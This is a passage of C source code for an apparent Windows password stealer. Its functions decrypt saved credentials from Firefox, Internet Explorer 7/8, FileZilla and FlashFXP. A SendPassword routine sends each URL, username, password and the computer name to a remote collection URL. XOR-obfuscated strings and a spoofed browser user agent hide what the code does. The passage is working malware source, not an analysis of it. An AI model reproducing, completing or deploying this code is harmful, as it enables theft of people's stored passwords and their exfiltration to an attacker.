		sscanf(&szEncPass[i*2], "%02x", &szDecPass[i]);
		szDecPass[i] ^= salt[i%8];
	}
	SendPassword("9", "", szUser, szDecPass);

	return 1;
}

// GetFirefox
//
//////////////////////////////////////////////////////////////////////
int GetFirefox(char *appData) {

	char firefoxPath[MAX_PATH], profilePath[MAX_PATH], signonsPath[MAX_PATH];
	char h0Path[MAX_PATH], h1Path[MAX_PATH], h2Path[MAX_PATH], h3Path[MAX_PATH];
	char h4Path[MAX_PATH], h5Path[MAX_PATH], h6Path[MAX_PATH], h7Path[MAX_PATH];
	HMODULE h0, h1, h2, h3, h4, h5, h6, h7;
	unsigned int i;

	NSS_Init NSSInit;
	PK11_GetInternalKeySlot PK11GetInternalKeySlot;
	PK11_Authenticate PK11Authenticate;
	PK11SDR_Decrypt PK11SDRDecrypt;
	PK11_FreeSlot PK11FreeSlot;
	NSS_Shutdown NSSShutdown;
	PL_Base64Decode PLBase64Decode;

	char *dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;

	char Separa[] = "\x0D\x0A\x2E\x0D\x0A";
	char NewLine[] = "\x0D\x0A";

	DWORD *slot;
	SECItem request, reply;

	char cryptData[512], *decodeData;
	int cryptLen, decodeLen, adjust;
	char szUrl[512], szUser[512], szPass[512];

	// "PK11_GetInternalKeySlot"
	char encryptVar11[] = "\x01\x51\x49\x32\x35\x5A\x46\x67\x77\x4D\x6B\x75\x67\x71\x6A\x64\x6D\x49\x66\x7D\x56\x6D\x6D\x77";
	// "PK11_Authenticate"
	char encryptVar12[] = "\x01\x51\x49\x32\x35\x5A\x40\x77\x77\x6C\x60\x6F\x76\x6A\x67\x64\x75\x67";
	// "PK11SDR_Decrypt"
	char encryptVar13[] = "\x01\x51\x49\x32\x35\x56\x45\x50\x5C\x40\x60\x62\x70\x7A\x74\x71";
	// "PK11_FreeSlot"
	char encryptVar14[] = "\x01\x51\x49\x32\x35\x5A\x47\x70\x66\x61\x56\x6D\x6D\x77";
	// "NSS_Shutdown"
	char encryptVar15[] = "\x01\x4F\x51\x50\x5B\x56\x69\x77\x77\x60\x6A\x76\x6C";
	// "PL_Base64Decode"
	char encryptVar16[] = "\x01\x51\x4E\x5C\x46\x64\x72\x67\x35\x30\x41\x64\x61\x6C\x60\x60";

	// "Path=Profiles/"
	char encryptVar18[] = "\x01\x51\x63\x77\x6C\x38\x51\x70\x6C\x62\x6C\x6D\x67\x70\x2B";
	// "\Mozilla\Firefox\Profiles\"
	char encryptVar19[] = "\x01\x5D\x4F\x6C\x7E\x6C\x6D\x6E\x62\x58\x43\x68\x70\x66\x62\x6A\x79\x5E\x53\x76\x6A\x67\x6B\x6F\x61\x76\x5D";
	// "\signons3.txt"
	char encryptVar20[] = "\x01\x5D\x71\x6A\x63\x6B\x6E\x6C\x70\x37\x2B\x75\x7A\x77";
	// "\signons2.txt"
	char encryptVar21[] = "\x01\x5D\x71\x6A\x63\x6B\x6E\x6C\x70\x36\x2B\x75\x7A\x77";
	// "<tr><td>Firefox 3</td><td>%s</td><td>%s</td><td>%s</td></tr>"
	char encryptVar22[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x42\x6C\x73\x67\x65\x6B\x7D\x21\x31\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x2D\x77\x76\x3B\xC\x8";
	// "<tr><td>Firefox 2</td><td>%s</td><td>%s</td><td>%s</td></tr>"
	char encryptVar23[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x42\x6C\x73\x67\x65\x6B\x7D\x21\x30\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x2D\x77\x76\x3B\xC\x8";
	// "SOFTWARE\Clients\StartMenuInternet\firefox.exe\shell\open\command"
	char encryptVar1[] = "\x01\x52\x4D\x45\x50\x52\x40\x50\x46\x58\x46\x6D\x6B\x66\x6A\x71\x72\x5E\x50\x70\x64\x73\x76\x4E\x61\x6B\x74\x4B\x6D\x70\x60\x73\x6C\x66\x70\x59\x67\x6B\x71\x61\x63\x6E\x7A\x2D\x61\x7D\x64\x5E\x70\x6C\x60\x6D\x6E\x5F\x6B\x75\x64\x6C\x5F\x67\x6A\x6C\x6F\x62\x6A\x61";
	// "\mozcrt19.dll"
	char encryptVar2[] = "\x01\x5D\x6F\x6C\x7E\x66\x73\x76\x32\x3D\x2B\x65\x6E\x6F";
	// "\nspr4.dll"
	char encryptVar3[] = "\x01\x5D\x6C\x70\x74\x77\x35\x2C\x67\x68\x69";
	// "\plds4.dll"
	char encryptVar4[] = "\x01\x5D\x72\x6F\x60\x76\x35\x2C\x67\x68\x69";
	// "\plc4.dll"
	char encryptVar5[] = "\x01\x5D\x72\x6F\x67\x31\x2F\x66\x6F\x68";
	// "\nssutil3.dll"
	char encryptVar6[] = "\x01\x5D\x6C\x70\x77\x70\x75\x6B\x6F\x37\x2B\x65\x6E\x6F";
	// "\sqlite3.dll"
	char encryptVar7[] = "\x01\x5D\x71\x72\x68\x6C\x75\x67\x30\x2A\x61\x6D\x6E";
	// "\softokn3.dll"
	char encryptVar8[] = "\x01\x5D\x71\x6C\x62\x71\x6E\x69\x6D\x37\x2B\x65\x6E\x6F";
	// "\nss3.dll"
	char encryptVar9[] = "\x01\x5D\x6C\x70\x77\x36\x2F\x66\x6F\x68";
	// "NSS_Init"
	char encryptVar10[] = "\x01\x4F\x51\x50\x5B\x4C\x6F\x6B\x77";


	// "\Mozilla\Firefox\profiles.ini"
	char encryptVar17[300];
	strcpy(encryptVar17, "\x01\x5D\x4F\x6C\x7E\x6C\x6D\x6E\x62\x58\x43\x68\x70\x66\x62\x6A\x79\x5E\x73\x76\x6A\x67\x6B\x6F\x61\x76\x2F\x6B\x6D\x6D");

	UnXor(encryptVar1);		UnXor(encryptVar2);
	UnXor(encryptVar3);		UnXor(encryptVar4);
	UnXor(encryptVar5);		UnXor(encryptVar6);
	UnXor(encryptVar7);		UnXor(encryptVar8);
	UnXor(encryptVar9);		UnXor(encryptVar10);
	UnXor(encryptVar11);	UnXor(encryptVar12);
	UnXor(encryptVar13);	UnXor(encryptVar14);
	UnXor(encryptVar15);	UnXor(encryptVar16);
	UnXor(encryptVar17);	UnXor(encryptVar18);
	UnXor(encryptVar19);	UnXor(encryptVar20);
	UnXor(encryptVar21);	UnXor(encryptVar22);
	UnXor(encryptVar23);

// Cogemos la ruta de instalacion
	if (!ReadKeyData(HKEY_LOCAL_MACHINE, encryptVar1, NULL, firefoxPath))
		return 0;

	if (firefoxPath[0] == 34) {
		for (i=0; i<strlen(firefoxPath)-1; i++)
			firefoxPath[i] = firefoxPath[i+1];
		firefoxPath[strlen(firefoxPath)-2] = 0;
	}
	firefoxPath[strlen(firefoxPath)-12] = 0;

// Cargamos las apis
	strcpy(h0Path, firefoxPath);	strcat(h0Path, encryptVar2);	h0 = LoadLibrary(h0Path);
	strcpy(h1Path, firefoxPath);	strcat(h1Path, encryptVar3);	h1 = LoadLibrary(h1Path);
	strcpy(h3Path, firefoxPath);	strcat(h3Path, encryptVar4);	h3 = LoadLibrary(h3Path);
	strcpy(h2Path, firefoxPath);	strcat(h2Path, encryptVar5);	h2 = LoadLibrary(h2Path);
	strcpy(h4Path, firefoxPath);	strcat(h4Path, encryptVar6);	h4 = LoadLibrary(h4Path);
	strcpy(h5Path, firefoxPath);	strcat(h5Path, encryptVar7);	h5 = LoadLibrary(h5Path);
	strcpy(h7Path, firefoxPath);	strcat(h7Path, encryptVar8);	h7 = LoadLibrary(h7Path); //Firefox 2	
	strcpy(h6Path, firefoxPath);	strcat(h6Path, encryptVar9);	h6 = LoadLibrary(h6Path);
	if (h2 == NULL || h6 == NULL)
		return 0;

// Cogemos las apis que necesitamos
	NSSInit = (NSS_Init) GetProcAddress(h6, encryptVar10);
	PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GetProcAddress(h6, encryptVar11);
	PK11Authenticate = (PK11_Authenticate) GetProcAddress(h6, encryptVar12);
	PK11SDRDecrypt = (PK11SDR_Decrypt) GetProcAddress(h6, encryptVar13);
	PK11FreeSlot = (PK11_FreeSlot) GetProcAddress(h6, encryptVar14);
	NSSShutdown = (NSS_Shutdown) GetProcAddress(h6, encryptVar15);
	PLBase64Decode = (PL_Base64Decode) GetProcAddress(h2, encryptVar16);

// Leemos los perfiles
	strcpy(profilePath, appData);
	strcat(profilePath, encryptVar17);

	if (!ReadFileData(profilePath, &dataBuffer, &dataLen))
		return 0;

	pIni = FindString(dataBuffer, dataLen, encryptVar18, 0);
	if (pIni == 0)
		return 0;
	pIni += 14;
	pFin = FindString(dataBuffer, dataLen, NewLine, pIni);

// Si hay algun perfil buscamos el archivo signons
	strcpy(profilePath, appData);
	strcat(profilePath, encryptVar19);
	strncat(profilePath, &dataBuffer[pIni], pFin - pIni);

	free(dataBuffer);


for (i=0; i<2; i++) {


// Cogemos los archivos de las diferentes versiones
	if (i == 0) {
		//Firefox 3
		strcpy(signonsPath, profilePath);
		strcat(signonsPath, encryptVar20);
	} else if (i == 1) {
		//Firefox 2
		strcpy(signonsPath, profilePath);
		strcat(signonsPath, encryptVar21);
	}
	if (!ReadFileData(signonsPath, &dataBuffer, &dataLen))
		continue;

//Iniciamos las apis
	if (NSSInit(profilePath) != SECSuccess)
		return 0;
	slot = PK11GetInternalKeySlot();
	if (!slot)
		return 0;
	if (PK11Authenticate(slot, 1, NULL) != SECSuccess)
		return 0;

	pIni = pFin = 0;

// Sacamos todas las contraseñas
	do {
		//Url
		pIni = FindString(dataBuffer, dataLen, Separa, pFin);
		if (pIni==0)
			break;
		pIni += 5;
		pFin = FindString(dataBuffer, dataLen, NewLine, pIni);

		strncpy(szUrl, &dataBuffer[pIni], pFin - pIni);
		szUrl[pFin - pIni] = 0;

		//Usuario
		pIni = FindString(dataBuffer, dataLen, NewLine, pFin + 2) + 2;
		pFin = FindString(dataBuffer, dataLen, NewLine, pIni);
		strncpy(cryptData, &dataBuffer[pIni], pFin - pIni);
		cryptData[pFin - pIni] = 0;
		cryptLen = strlen(cryptData);
		decodeData = PLBase64Decode(cryptData, cryptLen, NULL);

		adjust = 0;
		if (cryptData[cryptLen-1] == 61) {
			adjust++;
			if (cryptData[cryptLen-2] == 61) 
				adjust++;
		}
		decodeLen = (cryptLen * 3) / 4 - adjust;

		request.data = (unsigned char *)decodeData;
		request.len = decodeLen;
		if (PK11SDRDecrypt(&request, &reply, NULL) != SECSuccess)
			return 0;

		strncpy(szUser, (char *)reply.data, reply.len);
		szUser[reply.len] = 0;

		//Password
		pIni = FindString(dataBuffer, dataLen, NewLine, pFin + 2) + 2;
		pFin = FindString(dataBuffer, dataLen, NewLine, pIni);
		strncpy(cryptData, &dataBuffer[pIni], pFin - pIni);
		cryptData[pFin - pIni] = 0;
		cryptLen = strlen(cryptData);
		decodeData = PLBase64Decode(cryptData, cryptLen, NULL);

		adjust = 0;
		if (cryptData[cryptLen-1] == 61) {
			adjust++;
			if (cryptData[cryptLen-2] == 61) 
				adjust++;
		}
		decodeLen = (cryptLen * 3) / 4 - adjust;

		request.data = (unsigned char *)decodeData;
		request.len = decodeLen;
		if (PK11SDRDecrypt(&request, &reply, NULL) != SECSuccess)
			return 0;

		strncpy(szPass, (char *)reply.data, reply.len);
		szPass[reply.len] = 0;

		SendPassword("10", szUrl, szUser, szPass);


	} while (pFin != 0);

// Liberamos el slot y las dll
	PK11FreeSlot(slot);
	NSSShutdown();
	free(dataBuffer);

}

	FreeLibrary(h0); FreeLibrary(h1); FreeLibrary(h2); FreeLibrary(h3); FreeLibrary(h4); FreeLibrary(h5); FreeLibrary(h6); FreeLibrary(h7);

	return 1;
}

// GetInternetExplorer7
//
//////////////////////////////////////////////////////////////////////
int GetInternetExplorer7(FILE *hFile){
	HANDLE hCacheEnumHandle;
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
	HKEY rkey;
	DWORD dwCacheEntry, dwInStr, lpType, lpcbData, i;
	DATA_BLOB DataIn, DataOut, OptionalEntropy;
	char szUrl[4096], szHash[42], szDest[512];
	DWORD headerSize, dwDataOffset1, dwDataOffset2;
	char temp1[100]; 	char temp2[100];

	// "Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
	char encryptVar1[] = "\x01\x52\x6D\x65\x70\x72\x60\x70\x66\x58\x48\x68\x61\x71\x6B\x76\x6E\x64\x77\x58\x4C\x6F\x76\x66\x76\x6B\x64\x76\x23\x41\x7D\x71\x6E\x6C\x76\x60\x73\x5E\x4A\x6A\x71\x64\x6E\x6F\x6D\x43\x6E\x70\x6E\x77\x59\x52\x76\x6C\x76\x64\x66\x67\x31";
	// "<tr><td>Internet Explorer 7/8</td><td>%s</td><td>%ls</td><td>%ls</td></tr>"
	char encryptVar2[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x4D\x6B\x75\x67\x71\x6A\x60\x75\x22\x46\x7C\x75\x6D\x6D\x71\x61\x77\x21\x35\x2C\x3C\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x76\x67\x3A\x20\x6D\x71\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x6F\x77\x39\x2E\x76\x67\x3A\x39\x2E\x76\x71\x3A\x8\xB";
	UnXor(encryptVar1);		UnXor(encryptVar2);

//Comprobamos si hay contraseñas guardadas
	if (RegOpenKeyEx(HKEY_CURRENT_USER, encryptVar1, 0, KEY_READ, &rkey) != ERROR_SUCCESS)
		return 0;

//Listamos el historial
	dwCacheEntry = 0;
	hCacheEnumHandle = FindFirstUrlCacheEntry(NULL, 0, &dwCacheEntry);
	lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)malloc(dwCacheEntry);
    lpCacheEntry->dwStructSize = dwCacheEntry;
	hCacheEnumHandle = FindFirstUrlCacheEntry(NULL, lpCacheEntry, &dwCacheEntry);

	do {
		//Solo las URL visitadas
		if (lpCacheEntry->CacheEntryType == 2097153) {

			dwInStr = FindString(lpCacheEntry->lpszSourceUrlName, strlen(lpCacheEntry->lpszSourceUrlName), "@", 0);
			if (dwInStr != 0)
				dwInStr ++;

			for (i=0; i<=strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr; i++) {
				szUrl[i * 2] = lpCacheEntry->lpszSourceUrlName[i+dwInStr];
				szUrl[(i * 2) + 1] = 0;
			}

			if (!SHA1Hash(szUrl, strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr, szHash))
				return 0;

			lpType = REG_SZ;
			lpcbData = 512;
			if (RegQueryValueEx(rkey, szHash, 0, &lpType, (unsigned char *)szDest, &lpcbData) == ERROR_SUCCESS) {
				DataIn.cbData = lpcbData;
				DataIn.pbData = (DWORD)&szDest;
				OptionalEntropy.cbData = (strlen(lpCacheEntry->lpszSourceUrlName)-dwInStr) * 2 + 2;
				OptionalEntropy.pbData = (DWORD)&szUrl;
				if (CryptUnprotectData(&DataIn, NULL, &OptionalEntropy, NULL, NULL, 1, &DataOut)) {
					memcpy(&headerSize, (void *)(DataOut.pbData + 4), 4);
					headerSize += 12;
					memcpy(&dwDataOffset1, (void *)(DataOut.pbData + 36), 4);
					memcpy(&dwDataOffset2, (void *)(DataOut.pbData + 52), 4);
					sprintf(temp1, "%ls", (char *)(DataOut.pbData + headerSize+dwDataOffset1));
					sprintf(temp2, "%ls", (char *)(DataOut.pbData + headerSize+dwDataOffset2));
					SendPassword("11", &lpCacheEntry->lpszSourceUrlName[dwInStr], temp1, temp2);
					//fprintf(hFile, encryptVar2, &lpCacheEntry->lpszSourceUrlName[dwInStr], (void *)(DataOut.pbData + headerSize+dwDataOffset1), (void *)(DataOut.pbData + headerSize+dwDataOffset2));
				}
			}
		}

		dwCacheEntry = 0;
		FindNextUrlCacheEntry(hCacheEnumHandle, 0, &dwCacheEntry);
		if (dwCacheEntry == 0)
			break;
		lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)realloc(lpCacheEntry, dwCacheEntry);
		lpCacheEntry->dwStructSize = dwCacheEntry;

	} while (FindNextUrlCacheEntry(hCacheEnumHandle, lpCacheEntry, &dwCacheEntry));

	FindCloseUrlCache(hCacheEnumHandle);
	RegCloseKey(rkey);

	free(lpCacheEntry);
	return 1;
}

// GetFileZilla
//
//////////////////////////////////////////////////////////////////////
int GetFileZilla(char *appData) {
	char * dataBuffer = NULL;
	DWORD dataLen, pIni, pFin = 0;
	char sProfilePath[MAX_PATH];
	char szHost[100], szUser[100], szPass[100];

	// "<Host>"
	char encryptVar1[] = "\x01\x3D\x4A\x6C\x77\x71\x3F";
	// "</Host>"
	char encryptVar2[] = "\x01\x3D\x2D\x4B\x6B\x76\x75\x3C";
	// "<User>"
	char encryptVar3[] = "\x01\x3D\x57\x70\x61\x77\x3F";
	// "</User>"
	char encryptVar4[] = "\x01\x3D\x2D\x56\x77\x60\x73\x3C";
	// "<Pass>"
	char encryptVar5[] = "\x01\x3D\x52\x62\x77\x76\x3F";
	// "</Pass>"
	char encryptVar6[] = "\x01\x3D\x2D\x53\x65\x76\x72\x3C";
	// "\FileZilla\recentservers.xml"
	char encryptVar7[] = "\x01\x5D\x44\x6A\x68\x60\x5B\x6B\x6F\x68\x64\x5D\x70\x66\x67\x60\x6F\x76\x70\x61\x77\x77\x67\x71\x77\x2B\x79\x6F\x6F";
	// "<tr><td>FileZilla</td><td>%s</td><td>%s</td><td>%s</td></tr>"
	char encryptVar8[] = "\x01\x3D\x76\x71\x3A\x39\x75\x66\x3D\x42\x6C\x6D\x67\x59\x6D\x69\x6D\x63\x3F\x2B\x71\x65\x3C\x3F\x70\x61\x3F\x27\x70\x38\x2A\x75\x66\x3D\x38\x71\x65\x3C\x26\x77\x39\x2E\x76\x67\x3A\x39\x75\x66\x3D\x21\x76\x3D\x2D\x77\x60\x3B\x3D\x2D\x77\x76\x3B\xC\x8";
	UnXor(encryptVar1);		UnXor(encryptVar2);
	UnXor(encryptVar3);		UnXor(encryptVar4);
	UnXor(encryptVar5);		UnXor(encryptVar6);
	UnXor(encryptVar7);		UnXor(encryptVar8);

	strcpy(sProfilePath, appData);
	strcat(sProfilePath, encryptVar7);

	if (!ReadFileData(sProfilePath, &dataBuffer, &dataLen))
		return 0;

	while (1) {
		// Host
		pIni = FindString(dataBuffer, dataLen, encryptVar1, pFin);
		if (pIni == 0)
			break;
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, encryptVar2, pIni);
		strncpy(szHost, &dataBuffer[pIni], pFin - pIni);
		szHost[pFin - pIni] = 0;

		// User
		pIni = FindString(dataBuffer, dataLen, encryptVar3, pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, encryptVar4, pIni);
		strncpy(szUser, &dataBuffer[pIni], pFin - pIni);
		szUser[pFin - pIni] = 0;

		// Pass
		pIni = FindString(dataBuffer, dataLen, encryptVar5, pFin);
		if (pIni == 0) {
			free(dataBuffer);
			return 0;
		}
		pIni += 6;
		pFin = FindString(dataBuffer, dataLen, encryptVar6, pIni);
		strncpy(szPass, &dataBuffer[pIni], pFin - pIni);
		szPass[pFin - pIni] = 0;

		SendPassword("12", szHost, szUser, szPass);
		//fprintf(hFile, encryptVar8, szHost, szUser, szPass);
	}
	free(dataBuffer);
	return 1;
}

// GetFlashFXP
//
//////////////////////////////////////////////////////////////////////
int GetFlashFXP(char *commonAppData) {
	char * databuffer = NULL;
	unsigned long datalen, position=0;
	char szHost[100], szUser[100], szPass[100];
	unsigned char encPass[30], decPass[30];
	char sProfilePath[MAX_PATH];
	unsigned short int i;

	// "yA36zA48dEhfrvghGRg57h5UlDv3"
	char encryptVar1[] = "\x01\x78\x43\x30\x32\x7F\x40\x36\x3B\x60\x40\x69\x64\x71\x72\x62\x69\x45\x51\x63\x30\x36\x6A\x36\x51\x69\x45\x74\x30";
	// "Default Sites"
	char encryptVar2[] = "\x01\x45\x67\x65\x65\x70\x6D\x76\x23\x57\x6C\x75\x67\x70";
	// "\FlashFXP\3\Sites.dat"
	char encryptVar3[] = "\x01\x5D\x44\x6F\x65\x76\x69\x44\x5B\x54\x59\x32\x5E\x50\x6D\x71\x64\x71\x2D\x60\x64\x75";
	// "IP="
	char encryptVar4[] = "\x01\x48\x52\x3E";
	// "user="
	char encryptVar5[] = "\x01\x74\x71\x66\x76\x38";
	// "pass="
	char encryptVar6[] = "\x01\x71\x63\x70\x77\x38";
	UnXor(encryptVar1);		UnXor(encryptVar2);
	UnXor(encryptVar3);		UnXor(encryptVar4);
	UnXor(encryptVar5);		UnXor(encryptVar6);

	strcpy(sProfilePath, commonAppData);
	strcat(sProfilePath, encryptVar3);

	if (!ReadFileData(sProfilePath, &databuffer, &datalen))
		return 0;

	// Evitamos los default
	while (GetLine(&position, databuffer, datalen, encryptVar2, szHost)) { }
	// Descartamos el primero
	if (!GetLine(&position, databuffer, datalen, encryptVar4, szHost))
		return 0;

	while (1) {
		// Host
		if (!GetLine(&position, databuffer, datalen, encryptVar4, szHost))
			return 0;
		// User
		if (!GetLine(&position, databuffer, datalen, encryptVar5, szUser))
			return 0;
		// Pass
		if (!GetLine(&position, databuffer, datalen, encryptVar6, szPass))
			return 0;
		// Desencriptar contraseña
		for (i=0; i<strlen(szPass)/2; i++) {
			sscanf(&szPass[i*2], "%02X", &encPass[i]);
		}
		for (i=0; i<strlen(szPass)/2; i++) {
			decPass[i] = encPass[i+1] ^ encryptVar1[i];
			if (decPass[i] < encPass[i]) decPass[i]--;
			decPass[i] -= encPass[i];
		}
		decPass[i-1] = 0;
		SendPassword("13", szHost, szUser, decPass);
	}
	return 1;
}

// SendPassword
//
//////////////////////////////////////////////////////////////////////
int SendPassword(char *application, char *url, char *login, char *pass) {
	HINTERNET hOpen, hFile;
	char computerName[50], urlPath[1024], urlTmp[500];
	unsigned long dwSize = 50;

	// "Mozilla/5.0 Gecko/2009032609 Firefox/3.0.6"
	char encryptVar1[] = "\x01\x4C\x6D\x79\x6D\x69\x6D\x63\x2C\x31\x2B\x31\x22\x44\x61\x66\x6A\x6D\x2C\x36\x35\x31\x3B\x33\x37\x37\x37\x32\x3A\x24\x43\x68\x70\x66\x62\x6A\x79\x2D\x30\x2A\x35\x2F\x34";
	UnXor(encryptVar1);

// Cogemos el nombre del equipo
	GetComputerName(computerName, &dwSize);
	computerName[dwSize] = 0;

// Formamos la url
	strcpy(urlPath, stubConf.cUrl);
	strcat(urlPath, "?action=add&a=");
	strcat(urlPath, application);
	strcat(urlPath, "&u=");
	if (strlen(url)>0) {
		strcpy(urlTmp, url);
		strcat(urlPath, UrlEncode(urlTmp));
	}
	strcat(urlPath, "&l=");
	if (strlen(login)>0) {
		strcpy(urlTmp, login);
		strcat(urlPath, UrlEncode(urlTmp));
	}
	strcat(urlPath, "&p=");
	if (strlen(pass)>0) {
		strcpy(urlTmp, pass);
		strcat(urlPath, UrlEncode(urlTmp));
	} else
		return 0;
	strcat(urlPath, "&c=");
	strcpy(urlTmp, computerName);
	strcat(urlPath, UrlEncode(urlTmp));

//Enviamos los datos
	hOpen = InternetOpen(encryptVar1, 1, NULL, NULL, 0);
	hFile = InternetOpenUrl(hOpen, urlPath, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetCloseHandle(hFile);
	InternetCloseHandle(hOpen);

	return 1;
}

// SHA1Hash
//
//////////////////////////////////////////////////////////////////////
int SHA1Hash(unsigned char *buffer, unsigned long bufferlen, unsigned char *hash) {
	HCRYPTPROV hProv, hHash;
	unsigned long hashlen = 20;
	unsigned char retBuffer[20];
	unsigned char tail = 0;
	unsigned short int i;

	hash[0] = 0;
	if (CryptAcquireContext == NULL)
		return 0;

	CryptAcquireContext(&hProv, NULL, NULL, 1, 0);
	if (CryptCreateHash(hProv, 0x8004, 0, 0, &hHash)) {
		if (CryptHashData(hHash, buffer, bufferlen*2+2, 0)) {
			if (CryptGetHashParam(hHash, 2, retBuffer, &hashlen, 0)) {
				CryptDestroyHash(hHash);
				CryptReleaseContext(hProv, 0);
				for (i=0; i<20; i++) {
					tail += retBuffer[i];
					sprintf(hash, "%s%2.2X", hash, retBuffer[i]);
				}
				sprintf(hash, "%s%2.2X", hash, tail);
				return 1;
			}
		}
	}
	return 0;
}

// LoadApis
//
//////////////////////////////////////////////////////////////////////
int LoadApis(void) {

	// "advapi32.dll"
	char encryptVar1[] = "\x01\x60\x66\x75\x65\x75\x68\x31\x31\x2A\x61\x6D\x6E";
	// "CredEnumerateA"
	char encryptVar2[] = "\x01\x42\x70\x66\x60\x40\x6F\x77\x6E\x61\x77\x60\x76\x66\x45";
	// "CredFree"
	char encryptVar3[] = "\x01\x42\x70\x66\x60\x43\x73\x67\x66";
	// "CryptAcquireContextA"
	char encryptVar4[] = "\x01\x42\x70\x7A\x74\x71\x40\x61\x72\x71\x6C\x73\x67\x40\x6B\x6B\x75\x67\x7B\x70\x44";
	// "CryptCreateHash"
	char encryptVar5[] = "\x01\x42\x70\x7A\x74\x71\x42\x70\x66\x65\x71\x64\x4A\x62\x77\x6D";
	// "CryptHashData"
	char encryptVar6[] = "\x01\x42\x70\x7A\x74\x71\x49\x63\x70\x6C\x41\x60\x76\x62";
	// "CryptGetHashParam"
	char encryptVar7[] = "\x01\x42\x70\x7A\x74\x71\x46\x67\x77\x4C\x64\x72\x6A\x53\x65\x77\x60\x6F";
	// "CryptDestroyHash"
	char encryptVar8[] = "\x01\x42\x70\x7A\x74\x71\x45\x67\x70\x70\x77\x6E\x7B\x4B\x65\x76\x69";
	// "CryptReleaseContext"
	char encryptVar9[] = "\x01\x42\x70\x7A\x74\x71\x53\x67\x6F\x61\x64\x72\x67\x40\x6B\x6B\x75\x67\x7B\x70";
	// "crypt32.dll"
	char encryptVar10[] = "\x01\x62\x70\x7A\x74\x71\x32\x30\x2D\x60\x69\x6D";
	// "CryptUnprotectData"
	char encryptVar11[] = "\x01\x42\x70\x7A\x74\x71\x54\x6C\x73\x76\x6A\x75\x67\x60\x70\x41\x60\x76\x62";
	UnXor(encryptVar1);		UnXor(encryptVar2);
	UnXor(encryptVar3);		UnXor(encryptVar4);
	UnXor(encryptVar5);		UnXor(encryptVar6);
	UnXor(encryptVar7);		UnXor(encryptVar8);
	UnXor(encryptVar9);		UnXor(encryptVar10);
	UnXor(encryptVar11);


	hAdvapi32 = LoadLibrary(encryptVar1);
	if (hAdvapi32 != NULL) {
		// Credenciales
		CredEnumerate = (typeCredEnumerate)GetProcAddress(hAdvapi32, encryptVar2);
		CredFree = (typeCredFree)GetProcAddress(hAdvapi32, encryptVar3);
		// Algoritmos Crypto
		CryptAcquireContext = (typeCryptAcquireContext)GetProcAddress(hAdvapi32, encryptVar4);
		CryptCreateHash = (typeCryptCreateHash)GetProcAddress(hAdvapi32, encryptVar5);
		CryptHashData = (typeCryptHashData)GetProcAddress(hAdvapi32, encryptVar6);
		CryptGetHashParam = (typeCryptGetHashParam)GetProcAddress(hAdvapi32, encryptVar7);
		CryptDestroyHash = (typeCryptDestroyHash)GetProcAddress(hAdvapi32, encryptVar8);
		CryptReleaseContext = (typeCryptReleaseContext)GetProcAddress(hAdvapi32, encryptVar9);
	}

	hCrypt32  = LoadLibrary(encryptVar10);
	if (hCrypt32 != NULL)
		CryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32, encryptVar11);

	return 1;
}

// UnloadApis
//
//////////////////////////////////////////////////////////////////////
int UnloadoadApis(void) {
	FreeLibrary(hAdvapi32);
	FreeLibrary(hCrypt32);
	return 1;
}
